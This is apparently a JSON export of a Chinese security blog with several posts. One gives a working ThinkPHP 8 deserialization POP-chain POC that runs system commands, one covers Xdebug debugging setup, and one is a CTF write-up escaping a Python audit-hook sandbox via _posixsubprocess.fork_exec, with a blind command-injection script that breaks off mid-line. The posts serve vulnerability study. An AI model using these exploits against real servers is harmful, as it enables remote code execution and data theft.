src=\u0026#34;https://www.thinkphp.cn/welcome?version=\u0026#39; . \\think\\facade\\App::version() . \u0026#39;\u0026#34; width=\u0026#34;100%\u0026#34; height=\u0026#34;100%\u0026#34; frameborder=\u0026#34;0\u0026#34; scrolling=\u0026#34;auto\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;; } public function hello($name = \u0026#39;ThinkPHP8\u0026#39;) { return \u0026#39;hello,\u0026#39; . $name; } } 然后就可以开始愉快的代码审计了。\nps：好像这条链子后半部分和一个thinkphp6的很像，和我前面审的不一样，直接从这里学了，不再返回去审计那个了。\n——————\n代码审计 在一篇文章中看到了一个点，代码审计要选好sink点和source点，然后在挖链子的过程中去靠即可，感觉还是比较有意思的。\n——————\nsource点选择 一般的source点就是__destruct或者__wakeup方法，直接全局搜索__destruct方法，找到两个可以使用的点：\nLeague\\Flysystem\\Cached\\Storage\\AbstractCache：\n1 2 3 4 5 6 public function __destruct() { if (! $this-\u0026gt;autosave) { $this-\u0026gt;save(); } } think\\route\\ResourceRegister：\n1 2 3 4 5 6 public function __destruct() { if (!$this-\u0026gt;registered) { $this-\u0026gt;register(); } } 在这里选择的是第二个。\nsink点选择 一般框架的反序列化sink点都会选择call方法，因为一般可能的危险操作都在call方法上。\n在这里使用的是think\\Validate#__call，代码逻辑如下：\n1 2 3 4 5 6 7 8 9 10 public function __call($method, $args) { if (\u0026#39;is\u0026#39; == strtolower(substr($method, 0, 2))) { $method = substr($method, 2); } array_push($args, lcfirst($method)); return call_user_func_array([$this, \u0026#39;is\u0026#39;], $args); } 这个代码逻辑，如果想要能够进入if语句，需要$method名为类似iseval这种，然后就会截取，将$method的值更新为eval这种，最后就调用了call_user_func_array()方法，这个函数的调用也是非常有意思，给一个代码说说这里的逻辑：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Foo { function bar($arg, $arg2) { echo __METHOD__, \u0026#34; got $arg and $arg2\\n\u0026#34;; } } $foo = new Foo; call_user_func_array(array($foo, \u0026#34;bar\u0026#34;), array(\u0026#34;three\u0026#34;, \u0026#34;four\u0026#34;)); //output: Foo::bar got three and four 可以知道，这里就是调用$foo实例的bar()函数，那么同样的，在原来的payload上，这里就是调用$this的is()函数，全局搜索is函数，得到了如下函数：\n同样还是think/Validate类的is()函数，从图中可以看到最后这里的参数都是可控的，可以达到调用回调函数来达到命令注入的效果。\n现在sink点和source点都找到了，来看一下中间的链子。\n链子寻找 入口点是 think\\route\\ResourceRegister类的__destruct函数：\n1 2 3 4 5 6 public function __destruct() { if (!$this-\u0026gt;registered) { $this-\u0026gt;register(); } } $this-\u0026gt;registered变量可控，然后回调用到register()方法：\n1 2 3 4 5 6 protected function register() { $this-\u0026gt;registered = true; $this-\u0026gt;resource-\u0026gt;parseGroupRule($this-\u0026gt;resource-\u0026gt;getRule()); } 其实这里就能尝试调用__call()方法，但是在前面想要进行命令执行的地方，是需要在调用__call()方法时是需要有参数的，但是这里的getRule()方法是无法进行传参的。\n还是直接跟进，调用的getRule()方法会调用到Resource.php文件的父类的父类Rule类的getRule()方法：\n1 2 3 4 public function getRule() { return $this-\u0026gt;rule; } 所以这里的参数是可控的。\n然后看一下parseGroupRule()方法，会调用到Resource.php文件的parseGroupRule()方法：\n如上图，通过参数的控制，我们可以直接跳过第一个if语句的执行，直接执行后面的代码，然后看第二个框出来的部分，可以看见很明显的拼接操作，这里是可以尝试调用toString链的，这里再简单看一下这里的参数情况，看是否可以控制，审计了一下，发现是可以控制的，具体就看后面的POC吧，继续找链子。。\n现在就是需要去找调用toString()链子，这里选用的是think\\model\\concern\\Conversion类的__toString()链：\n跟进这个toJson()：\n然后调用toArray()：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 public function toArray(): array { $item = $visible = $hidden = []; $hasVisible = false; foreach ($this-\u0026gt;visible as $key =\u0026gt; $val) { if (is_string($val)) { if (str_contains($val, \u0026#39;.\u0026#39;)) { [$relation, $name] = explode(\u0026#39;.\u0026#39;, $val); $visible[$relation][] = $name; } else { $visible[$val] = true; $hasVisible = true; } } else { $visible[$key] = $val; } } foreach ($this-\u0026gt;hidden as $key =\u0026gt; $val) { if (is_string($val)) { if (str_contains($val, \u0026#39;.\u0026#39;)) { [$relation, $name] = explode(\u0026#39;.\u0026#39;, $val); $hidden[$relation][] = $name; } else { $hidden[$val] = true; } } else { $hidden[$key] = $val; } } // 追加属性（必须定义获取器） foreach ($this-\u0026gt;append as $key =\u0026gt; $name) { $this-\u0026gt;appendAttrToArray($item, $key, $name, $visible, $hidden); } ..............等代码 } 这里主要主要就是要调用最后的appendAttrToArray()方法：\n然后调用这里的getRelationWith()方法：\n这里就可以触发__call()方法，对于参数的传递，其实不难，但是有一个点没想明白：\n这里的rule会是什么？问我传参时并没有传这个参数，先简单构造看看这里的参数是什么。\nexp构造 问题说明 这里的参数说明就不具体说明了，直接构造即可，实在想不出的时候可以再看看P我构造出来的POC，这里有几个点需要说明一下：\n1.\n在前面的链子找寻过程中，可以知道链子其中一个是trait类型的Conversion类，是代码复用类型的，不能直接实例化来使用，但是我们需要利用到他的__toString()方法，怎么利用呢，自己构造的时候也是在Conversion类中有一个向下找的按钮：\n往下跳，到了Model抽象类:\n再往下就到了Pivot类：\n这个类就是可以直接实例化来使用的，所以最后我们要使用的类就是这个类。\n——————\n2.\n还有个就是前面遗留的$rule参数问题：\n果然还是调试一下就知道了，这里的$rule变量的值是visible，后面简单说说是怎么进行的：\n在__call方法中，触发的点是visible()方法：\n所以如下__call源码，这里会直接将这个$method的值直接push上数组中：\n让然后在调用is()函数时，对于$value和$rule的值，就是数组的第一个值和第二个值。\n3.\n最重要的一点，nivia师傅tql，也是我卡住的一点，导致这一步没构造出POC，简单贴一下我的原本错误的POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 \u0026lt;?php namespace think; class Validate { protected $type = []; function __construct(){ $this-\u0026gt;type=[\u0026#39;visible\u0026#39;=\u0026gt;\u0026#39;system\u0026#39;]; } } class Route{ } namespace think\\model; class Pivot { protected $visible = []; protected $hidden = []; protected $append = []; private $relation = []; function __construct(){ $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; \u0026#34;fupanc.whoami\u0026#34; ]; $this-\u0026gt;hidden=[ \u0026#39;113\u0026#39;=\u0026gt;true ]; $this-\u0026gt;append=[ \u0026#34;fupanc\u0026#34;=\u0026gt;\u0026#34;fupanc.111111\u0026#34; ]; $this-\u0026gt;relation=[ \u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\Validate() ]; } } namespace think\\route; class Resource { protected $rule; protected $option = []; protected $rest = []; protected $router; protected $name; function __construct(){ $this-\u0026gt;rule=\u0026#34;fupanc\u0026#34;; $this-\u0026gt;router=new \\think\\Route(); $this-\u0026gt;option=[ \u0026#34;var\u0026#34;=\u0026gt;[\u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\model\\Pivot()], ]; $this-\u0026gt;rest = [ \u0026#39;fupanc\u0026#39; =\u0026gt; [\u0026#34;111\u0026#34;,\u0026#34;\u0026lt;id\u0026gt;\u0026#34;] ]; $this-\u0026gt;name=\u0026#34;f\u0026#34;; } } namespace think\\route; class ResourceRegister { protected $registered; protected $resource; protected $name; function __construct(){ $this-\u0026gt;registered = false; $this-\u0026gt;name=\u0026#34;f\u0026#34;; $this-\u0026gt;resource=new \\think\\route\\Resource(); } } $a=new \\think\\route\\ResourceRegister(); echo urlencode(base64_encode(serialize($a))); 可以动态生成调试一下。\n就简单说说这里的差错点：\n同样的，我也是关注到了在toArray()方法中的对$this-\u0026gt;visible的分割，同样的最开始构造是是想要利用else语句中的代码块来进行赋值操作：\n但是在参数跟进中，发现这里是需要将这个$val设置为命令执行的参数，比如whoami，但是这里就一定会是字符串类型的，就一定不能成功调用，那么我前面的POC构造就顺应趋势，尝试对if中的语句进行利用，所以需要有.，让然后$name的值为命令执行参数，所以我传参\n1 2 3 $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; \u0026#34;fupanc.whoami\u0026#34; ]; 这样就能形成一个$visible['fupanc'][] = \u0026quot;whoami\u0026quot;了，在最后的调用call()方法时，这里的参数就是传递的这个：\n但是呀但是，顺应if语句的后果是，里面是一层数组（也就是会生成上面给的示例的结果）：\n本来我还很兴奋，刚好call_user_func_array()函数第二个就是需要一个数组类型，但是，在真正调用时，是在外面套了一层数组的：\n所以这里真正调用时是会报错的：\n所以这里是失败的。还是必须要进入到else中的语句呀，这样才能赋值为一个字符串类型，从而可以进行命令执行，但是一直想不通呀，怎么可以这样进行呢？\n最后还是看的nivia学长的文章，里面有如下说法：\n我最开始也是看不懂的，通过看POC以及写代码，终于理解到了。\n在这里nivia学长就是将$val设置为了一个实例化对象，然后在函数调用时会触发toString()函数，从而输出这个内容，但是也是一直没想清楚是哪里调用了触发了toString()方法，后面想到了命令执行函数，需要string类型，那么很有可能是这个点，测试代码如下：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Student{ function __toString(){ return \u0026#34;whoami\u0026#34;; } } $a=new Student(); call_user_func_array(\u0026#34;system\u0026#34;,[$a]); 最后成功进行命令执行。成功，那么就是这样进行的。\n并且，这里非常非常重要的是，还刚好有一个类的toString()函数是符合这个条件的：\ntoString()函数内容如下：\n1 2 3 4 public function __toString(): string { return (string) $this-\u0026gt;value; } 哇塞，太符合了，怎么就会有这么巧的情况出现，tql，又学到一个新的利用点。\n————————\n最终POC 完事具备，最后的完整POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 \u0026lt;?php namespace Symfony\\Component\\VarDumper\\Caster; class ConstStub{ protected $value; function __construct(){ $this-\u0026gt;value=\u0026#34;whoami\u0026#34;; } } namespace think; class Validate { protected $type = []; function __construct(){ $this-\u0026gt;type=[\u0026#39;visible\u0026#39;=\u0026gt;\u0026#39;system\u0026#39;]; } } class Route{ } namespace think\\model; class Pivot { protected $visible = []; protected $hidden = []; protected $append = []; private $relation = []; function __construct(){ $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; new \\Symfony\\Component\\VarDumper\\Caster\\ConstStub ]; $this-\u0026gt;hidden=[ \u0026#39;113\u0026#39;=\u0026gt;true ]; $this-\u0026gt;append=[ \u0026#34;fupanc\u0026#34;=\u0026gt;\u0026#34;fupanc.111111\u0026#34; ]; $this-\u0026gt;relation=[ \u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\Validate() ]; } } namespace think\\route; class Resource { protected $rule; protected $option = []; protected $rest = []; protected $router; protected $name; function __construct(){ $this-\u0026gt;rule=\u0026#34;fupanc\u0026#34;; $this-\u0026gt;router=new \\think\\Route(); $this-\u0026gt;option=[ \u0026#34;var\u0026#34;=\u0026gt;[\u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\model\\Pivot()], ]; $this-\u0026gt;rest = [ \u0026#39;fupanc\u0026#39; =\u0026gt; [\u0026#34;111\u0026#34;,\u0026#34;\u0026lt;id\u0026gt;\u0026#34;] ]; $this-\u0026gt;name=\u0026#34;f\u0026#34;; } } namespace think\\route; class ResourceRegister { protected $registered; protected $resource; protected $name; function __construct(){ $this-\u0026gt;registered = false; $this-\u0026gt;name=\u0026#34;f\u0026#34;; $this-\u0026gt;resource=new \\think\\route\\Resource(); } } $a=new \\think\\route\\ResourceRegister(); echo urlencode(base64_encode(serialize($a))); 成功命令执行：\n简单优化了一下POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 \u0026lt;?php namespace Symfony\\Component\\VarDumper\\Caster; class ConstStub{ protected $value; function __construct(){ $this-\u0026gt;value=\u0026#34;whoami\u0026#34;; } } namespace think; class Validate { protected $type = []; function __construct(){ $this-\u0026gt;type=[\u0026#39;visible\u0026#39;=\u0026gt;\u0026#39;system\u0026#39;]; } } class Route{ } namespace think\\model; class Pivot { protected $visible = []; protected $hidden = []; protected $append = []; private $relation = []; function __construct(){ $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; new \\Symfony\\Component\\VarDumper\\Caster\\ConstStub ]; $this-\u0026gt;hidden=[ \u0026#39;113\u0026#39;=\u0026gt;true ]; $this-\u0026gt;append=[ \u0026#34;fupanc\u0026#34;=\u0026gt;\u0026#34;fupanc.111111\u0026#34; ]; $this-\u0026gt;relation=[ \u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\Validate() ]; } } namespace think\\route; class Resource { protected $rule; protected $option = []; protected $rest = []; protected $router; protected $name; function __construct(){ $this-\u0026gt;rule=\u0026#34;fupanc\u0026#34;; $this-\u0026gt;router=new \\think\\Route(); $this-\u0026gt;option=[ \u0026#34;var\u0026#34;=\u0026gt;[\u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\model\\Pivot()], ]; $this-\u0026gt;rest = [ \u0026#39;fupanc\u0026#39; =\u0026gt; [\u0026#34;111\u0026#34;,\u0026#34;\u0026lt;id\u0026gt;\u0026#34;] ]; $this-\u0026gt;name=\u0026#34;f\u0026#34;; } } namespace think\\route; class ResourceRegister { protected $registered; protected $resource; protected $name; function __construct(){ $this-\u0026gt;resource=new \\think\\route\\Resource(); } } $a=new \\think\\route\\ResourceRegister(); echo urlencode(base64_encode(serialize($a))); ——————\n总结 intersting，very intersting，一切都是最好的安排，好玩好玩。\n参考文章：\nhttps://xz.aliyun.com/news/14341\n——————————\nThinkphp的漏洞还是很多的，其他的就不复现了，还想再复现的可以在漏洞库找找。\n注：每一部分的参考文章都是不同的。\n","date":"2025-03-07T22:09:04+08:00","permalink":"https://fupanc-w1n.github.io/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"ThinkPHP漏洞复现"},{"content":"phpstorm远程调试环境搭建 搭建工具需求：phpstorm+phpstudy\n过程说明 首先是在phpstudy搭建一个网站，然后在扩展里选上xdebug：\n可以写一个phpinfo()回显页面，然后全部赋值粘贴拿到xdebug官方页面来寻求适配的xdebug版本：\n下载给的文件，然后将其改名为php_xdebug.dll并放在ext目录下。\n再然后修改一下php.ini内容，这里走了很多坑，如下即可：\n1 2 3 4 5 6 7 8 9 10 [Xdebug] zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll xdebug.log=D:/phpstudy_pro/xdebug.log xdebug.mode=debug; xdebug.remote_handler=\u0026#34;dbgp\u0026#34; xdebug.start_with_request = yes xdebug.discover_client_host = yes xdebug.client_host = localhost xdebug.client_port = 62649 xdebug.idekey=\u0026#34;PHPSTORM\u0026#34; 注意一下xdebug2和xdebug3的区别，我这里是xdebug3。然后就是配置phpstorm了：\n在设置的debug部分：\n一定要开启侦听，然后这里的端口需要与前面配置文件中的client_port相同。\n然后配置DBGp代理：\n然后配置一个服务器：\n这里的主机可以随便填，但是端口就需要和phpstudy上的一样。然后编辑配置：\n加一个PHP网页：\n可以点击验证来验证一下：\n然后打一个断点就可以开始调试了：\n调试超时解决方法：\n1.php.ini需要设置xdebug和mac_execution_time等，来增加等待时间：\n1 2 3 4 5 # 超时时间改大一点 xdebug.remote_cookie_expire_time = 7200 max_execution_time=7200 max_input_time=7200 default_socket_timeout = 7200 2.修改apache的配置文件，这里就贴一下我加的一些配置：\n修改httpd.conf：将下面这行的前面的注释去掉：\n1 Include conf/extra/httpd-default.conf 然后添加如下一行：\n1 Include conf/extra/httpd-fcgid.conf 并且在最后加上如下内容\n1 2 3 4 5 6 # 超时时间改大一点 Timeout 7200 FcgidIOTimeout 7200 FcgidIdleTimeout 7200 IPCConnectTimeout 7200 IPCCommTimeout 7200 然后在conf\\extra\\httpd-default.conf里修改，修改文档内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # # Timeout: The number of seconds before receives and sends time out. # Timeout 7200 # # KeepAlive: Whether or not to allow persistent connections (more than # one request per connection). Set to \u0026#34;Off\u0026#34; to deactivate. # KeepAlive On # # MaxKeepAliveRequests: The maximum number of requests to allow # during a persistent connection. Set to 0 to allow an unlimited amount. # We recommend you leave this number high, for maximum performance. # MaxKeepAliveRequests 0 # # KeepAliveTimeout: Number of seconds to wait for the next request from the # same client on the same connection. # KeepAliveTimeout 7200 最后在apache\\conf\\extra目录下新建一个httpd-fcgid.conf文件，加入如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ProcessLifeTime 7200 FcgidIOTimeout 7200 FcgidConnectTimeout 7200 FcgidOutputBufferSize 128 FcgidMaxRequestsPerProcess 1000 FcgidMinProcessesPerClass 0 FcgidMaxProcesses 16 FcgidMaxRequestLen 268435456 FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000 IPCConnectTimeout 7200 IPCCommTimeout 7200 FcgidIdleTimeout 7200 FcgidBusyTimeout 60000 FcgidBusyScanInterval 120 FcgidInitialEnv PHPRC \u0026#34;D:\\phpstudy_pro\\Extensions\\php\\php7.4.3nts\u0026#34; AddHandler fcgid-script .php php路径自己修改，然后如果还想改时间更长的话就是改上面的7200这个数字。\n最后重启一下apache即可，应该就是可以了。\n易坑点 几个比较重要的点吧，也有些是这里想着重说明的：\n每次修改php.ini文件，都是需要重启一次服务的。直接在phpstudy上的apache哪里重启就行了。 如果有几个环境，比如phpstudy上创建了几个网站，搞混了就比较麻烦，在验证这里我是卡了很久的。如果按照前面的操作，在最后验证的那一步出现了什么端口繁忙等等问题，关掉其他网站，然后重启电脑再次尝试。 参考文章：\nhttps://www.cnblogs.com/gaorenyusi/p/18213773\nhttps://blog.csdn.net/kelleo/article/details/135215408\nhttps://blog.csdn.net/weixin_43888304/article/details/120802226\nhttps://xdebug.org/docs/upgrade_guide#changed-xdebug.remote_autostart\n","date":"2025-03-02T16:11:22+08:00","permalink":"https://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"phpstorm远程调试环境搭建"},{"content":"WEB ezoj 啊？怎么整个五个算法题给CTF选手做？？这我不得不展示一下真正的技术把测评机打穿。 题目环境不出网。\n——————\n开题就是几个算法题，在页面下方看到\n访问source路由拿到源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 import os import subprocess import uuid import json from flask import Flask, request, jsonify, send_file from pathlib import Path app = Flask(__name__) SUBMISSIONS_PATH = Path(\u0026#34;./submissions\u0026#34;) PROBLEMS_PATH = Path(\u0026#34;./problems\u0026#34;) SUBMISSIONS_PATH.mkdir(parents=True, exist_ok=True) CODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; class OJTimeLimitExceed(Exception): pass class OJRuntimeError(Exception): pass @app.route(\u0026#34;/\u0026#34;) def index(): return send_file(\u0026#34;static/index.html\u0026#34;) @app.route(\u0026#34;/source\u0026#34;) def source(): return send_file(\u0026#34;server.py\u0026#34;) @app.route(\u0026#34;/api/problems\u0026#34;) def list_problems(): problems_dir = PROBLEMS_PATH problems = [] for problem in problems_dir.iterdir(): problem_config_file = problem / \u0026#34;problem.json\u0026#34; if not problem_config_file.exists(): continue problem_config = json.load(problem_config_file.open(\u0026#34;r\u0026#34;)) problem = { \u0026#34;problem_id\u0026#34;: problem.name, \u0026#34;name\u0026#34;: problem_config[\u0026#34;name\u0026#34;], \u0026#34;description\u0026#34;: problem_config[\u0026#34;description\u0026#34;], } problems.append(problem) problems = sorted(problems, key=lambda x: x[\u0026#34;problem_id\u0026#34;]) problems = {\u0026#34;problems\u0026#34;: problems} return jsonify(problems), 200 @app.route(\u0026#34;/api/submit\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def submit_code(): try: data = request.get_json() code = data.get(\u0026#34;code\u0026#34;) problem_id = data.get(\u0026#34;problem_id\u0026#34;) if code is None or problem_id is None: return ( jsonify({\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Missing \u0026#39;code\u0026#39; or \u0026#39;problem_id\u0026#39;\u0026#34;}), 400, ) problem_id = str(int(problem_id)) problem_dir = PROBLEMS_PATH / problem_id if not problem_dir.exists(): return ( jsonify( {\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Problem ID {problem_id} not found!\u0026#34;} ), 404, ) code_filename = SUBMISSIONS_PATH / f\u0026#34;submission_{uuid.uuid4()}.py\u0026#34; with open(code_filename, \u0026#34;w\u0026#34;) as code_file: code = CODE_TEMPLATE + code code_file.write(code) result = judge(code_filename, problem_dir) code_filename.unlink() return jsonify(result) except Exception as e: return jsonify({\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: str(e)}), 500 def judge(code_filename, problem_dir): test_files = sorted(problem_dir.glob(\u0026#34;*.input\u0026#34;)) total_tests = len(test_files) passed_tests = 0 try: for test_file in test_files: input_file = test_file expected_output_file = problem_dir / f\u0026#34;{test_file.stem}.output\u0026#34; if not expected_output_file.exists(): continue case_passed = run_code(code_filename, input_file, expected_output_file) if case_passed: passed_tests += 1 if passed_tests == total_tests: return {\u0026#34;status\u0026#34;: \u0026#34;AC\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Accepted\u0026#34;} else: return { \u0026#34;status\u0026#34;: \u0026#34;WA\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Wrang Answer: pass({passed_tests}/{total_tests})\u0026#34;, } except OJRuntimeError as e: return {\u0026#34;status\u0026#34;: \u0026#34;RE\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Runtime Error: ret={e.args[0]}\u0026#34;} except OJTimeLimitExceed: return {\u0026#34;status\u0026#34;: \u0026#34;TLE\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Time Limit Exceed\u0026#34;} def run_code(code_filename, input_file, expected_output_file): with open(input_file, \u0026#34;r\u0026#34;) as infile, open( expected_output_file, \u0026#34;r\u0026#34; ) as expected_output: expected_output_content = expected_output.read().strip() process = subprocess.Popen( [\u0026#34;python3\u0026#34;, code_filename], stdin=infile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, ) try: stdout, stderr = process.communicate(timeout=5) except subprocess.TimeoutExpired: process.kill() raise OJTimeLimitExceed if process.returncode != 0: raise OJRuntimeError(process.returncode) if stdout.strip() == expected_output_content: return True else: return False if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5000) 审计代码，关键代码就是传参，然后可以往python文件写python代码，但是设置了audit沙箱，简单说几个关键代码，写入文件的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 CODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; 。。。。。。 code_filename = SUBMISSIONS_PATH / f\u0026#34;submission_{uuid.uuid4()}.py\u0026#34; with open(code_filename, \u0026#34;w\u0026#34;) as code_file: code = CODE_TEMPLATE + code code_file.write(code) 这里就是从post传参来获取到code的值，让然后拼接CODE_TEMPLATE写入到一个python文件。\n运行python文件代码：\n1 2 3 4 5 6 7 8 9 10 process = subprocess.Popen( [\u0026#34;python3\u0026#34;, code_filename], stdin=infile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, ) try: stdout, stderr = process.communicate(timeout=5) 就是执行python文件。可以进行对python文件内容进行代码注入，看拼接的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 CODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; audit hook沙箱，就是限制了sys对进程的一些加载以及利用。可以看到是允许import操作，以及time模块的sleep方法等，这里就是audithook沙箱，可以打沙箱逃逸，在audit沙箱逃逸中，非常经典的就是使用fok_exec()函数，即利用_posixsubprocess模块，这个模块就是创建了一个子进程，可以进行命令执行，一个简单的payload如下：\n1 2 3 4 import os import _posixsubprocess _posixsubprocess.fork_exec([b\u0026#34;/bin/sh\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;cat /etc/passwd\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) 可以本地测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) import os import _posixsubprocess _posixsubprocess.fork_exec([b\u0026#34;/bin/sh\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;ls /\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) 执行效果如下：\n成功命令执行。\n但是现在就需要想在题目中怎么利用。\n题目描述说了环境不出网。那就打命令盲注。参考到之前的脚本稍微改改：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import requests import time url = \u0026#34;http://121.41.238.106:13847/api/submit\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-\u0026#34; result = \u0026#34;\u0026#34; for i in range(1, 5): # 假设有 4 行 print(f\u0026#34;第{i}行\u0026#34;) for j in range(1, 7): # 假设每行最多 7个字符 for char in charset: # 限制字符范围为字母和数字 json_data = { \u0026#34;problem_id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34;: f\u0026#39;\u0026#39;\u0026#39;import os import _posixsubprocess _posixsubprocess.fork_exec([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;if [ $(ls / | awk NR=={i} | cut -c {j}) = \u0026#39;{char}\u0026#39; ];then sleep 2; fi\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False) \u0026#39;\u0026#39;\u0026#39; } try: start_time = time.time() res = requests.post(url, json=json_data) end_time = time.time() delay = end_time - start_time if delay \u0026gt; 2: result += char print(f\u0026#34;当前结果: {result}\u0026#34;) break except Exception as e: print(f\u0026#34;请求失败: {e}\u0026#34;) continue result += \u0026#34; \u0026#34; print(\u0026#34;最终结果:\u0026#34;) print(result) 就是有点慢，一直等着跑：\n还没跑出来flag文件名称，简单改一下i的范围即可，然后继续跑，跑出来一个flag-9的名称：\n直接用通配符*匹配然后读取内容，注意将j的值改大点，简单改改就行了：\n1 2 3 4 5 6 7 8 9 10 11 for i in range(1, 2): # 假设有 4 行 print(f\u0026#34;第{i}行\u0026#34;) for j in range(1, 30): # 假设每行最多 7 个字符 for char in charset: # 限制字符范围为字母和数字 json_data = { \u0026#34;problem_id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34;: f\u0026#39;\u0026#39;\u0026#39;import os import _posixsubprocess _posixsubprocess.fork_exec([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;if [ $(cat /flag-9* | awk NR=={i} | cut -c {j}) = 